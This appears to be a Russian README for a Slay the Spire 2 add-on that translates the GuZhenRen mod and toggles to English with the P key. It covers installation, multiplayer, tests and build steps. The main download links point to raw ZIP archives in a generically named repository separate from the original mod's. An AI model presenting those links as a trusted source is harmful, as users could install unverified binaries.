# GuZhenRen: русский перевод и переключение P

**[Скачать дополнение](https://github.com/avayn965-ctrl/123/raw/refs/heads/main/dist/GuZhenRen-Russian-P-0.7.2-ru1.zip)** · [Исходники](https://github.com/avayn965-ctrl/123/raw/refs/heads/main/dist/GuZhenRen-Russian-P-0.7.2-ru1-source.zip) · [Отчёт проверок](../dist/GuZhenRen-Russian-P-0.7.2-ru1-validation.txt)

Для **GuZhenRen 0.7.2-beta.1**, также подходит 0.7.2: все 1388 строк в 13 таблицах совпадают в этих двух официальных релизах. Автор исходного мода — [miku332](https://github.com/miku332/STS2-GuZhenRen). Дополнение распространяется по GPL-3.0; см. [LICENSE](LICENSE).

## Установка

1. Закройте игру. Сохраните установленный **GuZhenRen 0.7.2-beta.1** и его зависимость **STS2-RitsuLib**. Для public beta используйте соответствующие версии исходного мода и RitsuLib.
2. Распакуйте папку **GuZhenRenRussian** из архива в `Slay the Spire 2/mods/`, рядом с папкой **GuZhenRen**.
3. Запустите игру заново. В списке модов появится **GuZhenRen — Русский / English (P)**.

Это отдельное дополнение: исходные DLL/PCK GuZhenRen остаются на месте. В архиве перевода нет исходного игрового мода, RitsuLib или файлов самой игры. Чтобы удалить перевод, закройте игру и удалите только папку `GuZhenRenRussian`.

## Использование

- По умолчанию тексты GuZhenRen русские, независимо от языка основной игры.
- **P** переключает их на оригинальный английский. Повторное нажатие возвращает русский. Язык игры и других модов сохраняется.
- Клавиша работает у хоста и подключившихся игроков, в меню, забеге и во время паузы. Используется физическая клавиша P, независимо от раскладки клавиатуры.
- При вводе в текстовом поле/чате клавиша не переключает язык. Удержание не вызывает повторных переключений.
- Выбор языка сохраняется в `user://guzhenren-russian-language.txt` и восстанавливается после перезапуска.
- Видимые карты обновляются сразу, сохраняя предпросмотр улучшения. Если дополнительная подсказка уже открыта и осталась прежней, уберите курсор и наведите снова.

Переведены карты, способности, ключевые слова, реликвии, рецепты, события, диалоги, персонаж, враги, зелья, выбор материалов, место отдыха и текстовые настройки исходного мода. Все переменные урона/блока, ветки улучшений и цветовые теги сохранены. Английские строки встроены без изменения значений из оригинального PCK.

## Мультиплеер

Выбор языка локальный: одному игроку можно оставить русский, другому — английский. Переключение не отправляет сетевых сообщений и не меняет RNG. У участников должны быть совместимые версии **самого GuZhenRen и RitsuLib**. Дополнение отмечено как `affects_gameplay: false`.

У исходного **Гу водного узора / Hydrology Gu** количество золота зависит от длины названий разыгранных карт. Для его расчёта дополнение сохраняет исходные названия до перевода. Поэтому P не меняет счётчик и награду. Защита применяется только к чтению названия для этой реликвии; состояние боя, цены, сетевые действия и формулы исходного мода не заменяются.

## Проверки и ограничения

Проверены все **1388 ключей**: полнота русского перевода, неизменность переменных и дерева условий SmartFormat, цветовых тегов и отсутствие временных маркеров. Английская копия сверена с PCK обоих официальных релизов.

**20 проверок в Godot 4.5.1 Mono** используют настоящий Harmony и нативный ввод: P, удержание, повторное нажатие, чат, пауза, сохранение, независимость языка игры и других модов, живое обновление карт, сохранение предпросмотра, исходный текст в асинхронном расчёте реликвии и отсутствие утечки режима в интерфейс. Отдельные процессы проверяют сохранение английского после перезапуска и независимый русский язык другого пользователя.

API проверено по предоставленной `sts2.dll` v0.111.0 и DLL исходного GuZhenRen. Проверки интерфейса используют подставные игровые классы. **Полная игра и настоящий сетевой сеанс здесь не запускались.** Совместимость механик исходного GuZhenRen со всеми версиями public beta это дополнение не исправляет. Надписи, нарисованные непосредственно на изображениях, и звук не меняются.

## Сборка

Нужны .NET SDK 9, Python 3, Godot 4.5.1 Mono и локальные `sts2.dll`, `GodotSharp.dll`, `0Harmony.dll`. Для аудита нужен оригинальный ZIP GuZhenRen 0.7.2-beta.1; можно дополнительно указать 0.7.2.

```sh
python guzhenren-ru/tools/build_release.py \
  --game-dll /path/to/sts2.dll \
  --godotsharp /path/to/GodotSharp.dll \
  --harmony /path/to/0Harmony.dll \
  --original-mod /path/to/STS2-GuZhenRen-v0.7.2-beta.1.zip \
  --godot /path/to/Godot_v4.5.1-stable_mono_linux.x86_64
```

На Linux тесту Harmony в официальной сборке Godot может потребоваться `LD_PRELOAD=libgcc_s.so.1`; скрипт сборки задаёт это только для тестовых процессов. Для установки в Windows это не требуется. Тестовая сборка `sts2.dll` содержит подставные классы; её нельзя копировать в игру.

Проверка перевода без SDK и игры:

```sh
python guzhenren-ru/tools/validate_translations.py
```
